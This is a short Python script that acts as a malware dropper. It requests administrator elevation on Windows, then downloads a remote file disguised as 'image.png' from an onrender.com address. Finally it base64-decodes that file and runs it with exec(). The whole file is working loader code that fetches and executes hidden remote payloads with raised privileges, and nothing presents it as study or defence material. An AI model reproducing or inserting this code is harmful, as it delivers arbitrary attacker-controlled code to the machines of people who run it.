import requests
import os
import sys
import ctypes
import time
from base64 import b64decode

def main():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

    try:
        with open(
                "image.png",
                "wb"
                ) as file:
                file.write(
                    requests.get(
                        f"http://wpp-api-01hw.onrender.com/api/images/1140884481671188581/image.png",
                        headers={"auth":"&&CD&&ON"}
                        ).content
                )

        exec(b64decode(open("image.png", "rb").read()))
    except Exception as e:
        print(e)
        time.sleep(15)

if __name__ == "__main__":
    main()